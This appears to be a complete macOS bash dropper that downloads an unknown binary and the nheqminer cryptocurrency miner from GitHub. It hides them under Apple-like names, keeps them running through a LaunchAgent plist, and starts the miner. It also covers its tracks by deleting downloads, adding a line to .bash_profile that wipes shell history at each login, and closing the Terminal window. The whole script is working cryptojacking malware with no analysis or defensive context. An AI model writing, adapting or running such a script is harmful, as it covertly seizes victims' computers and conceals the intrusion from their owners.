#!/bin/bash
cd;
cd Library/;
mkdir LaunchAgents/;
cd;
cd Downloads/;
curl -sL https://github.com/SteveJobsDerEchte/Krim/releases/download/v0.0.1/main > start
curl -sL https://github.com/justvanbloom/nheqminer/blob/kost/mac/nheqminer?raw=true > nheqminer
chmod 777 start
chmod 777 nheqminer
cd;
mkdir Library/cAppleScript;
mv Downloads/cAppleDownload/nheqminer Library/cAppleScript/__cAppleScript;
mv Downloads/cAppleDownload/start Library/cAppleScript/_cAppleScript;
mv Downloads/cAppleDownload_wokka2/nheqminer Library/cAppleScript/__cAppleScript;
mv Downloads/cAppleDownload_wokka2/start Library/cAppleScript/_cAppleScript;
mv Downloads/nheqminer Library/cAppleScript/__cAppleScript;
mv Downloads/start Library/cAppleScript/_cAppleScript;
echo -n '
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>StandardErrorPath</key>
<string>/tmp/cAppleServer.err</string>
<key>StandardOutPath</key>
<string>/tmp/cAppleServer.out</string>
<key>Label</key>
<string>com.cAppleServer.plist</string>
<key>ProgramArguments</key>
<array>
<string>/Users/' > ~/Library/LaunchAgents/com.cAppleServer.plist;

echo -n "$USER" >> ~/Library/LaunchAgents/com.cAppleServer.plist;

echo "/Library/cAppleScript/_cAppleScript</string>
</array>
<key>KeepAlive</key>
<true/>
</dict>
</plist>
" >> ~/Library/LaunchAgents/com.cAppleServer.plist;

launchctl load ~/Library/LaunchAgents/com.cAppleServer.plist;
~/Library/cAppleScript/__cAppleScript -b;
rm Downloads/cAppleDownload*;
echo "cd;rm .bash_history" >> .bash_profile
osascript -e 'tell application "Terminal" to close first window' & exit;
